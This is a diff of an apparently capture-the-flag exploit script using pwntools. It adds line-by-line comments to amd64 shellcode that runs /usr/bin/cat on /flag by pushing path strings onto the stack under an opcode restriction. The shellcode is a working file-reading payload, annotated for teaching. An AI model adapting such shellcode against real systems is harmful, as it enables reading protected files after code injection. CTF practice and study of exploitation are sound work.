@@ -5,19 +5,19 @@ import re
 context.arch = 'amd64'
 
 shellcode=f"""
-push {u32(b"/cat")} 
-push {u32(b"/usr")}  /* /usr */
-mov dword ptr [rsp+4], {u32(b"/bin")}  # b'/bin/cat'
-push rsp
-pop rdi
-push {u32(b"/fla")} 
-mov dword ptr [rsp+4], {u8(b"g")} 
-push rsp
-pop rsi
-push 0
-push rsi
-push rdi
-push rsp
+push {u32(b"/cat")}                        /* Push "tac/" onto the stack (32bit/4byte) */
+push {u32(b"/usr")}                        /* Push rsu/ onto the stack (32bit/4byte) */
+mov dword ptr [rsp+4], {u32(b"/bin")}      /* moves nib/ to the remaining 4 bytes of the previous stackframe' */
+push rsp                                   /* push content of rsp (/usr/bin/cat) on the stack */
+pop rdi                                    /* pop it from the stack to rdi, if we would not have the opcode restriction we could have used mov, rdi is the first argument */
+push {u32(b"/fla")}                        /* Push alf/ onto the stack (32bit/4byte) */
+mov dword ptr [rsp+4], {u8(b"g")}          /* moves "g" to the remaining 4 bytes of the previous stackframe' */
+push rsp                                   /* same mov circumvention trick */
+pop rsi                                    /* ^^ */
+push 0                                     /* Null byte to terminate string */
+push rsi                                   /* push 2nd arg on the stack */
+push rdi                                   /* push 1st arg on the stack */
+push rsp                                   /* ? */
 pop rsi
 push 0
 pop rdx
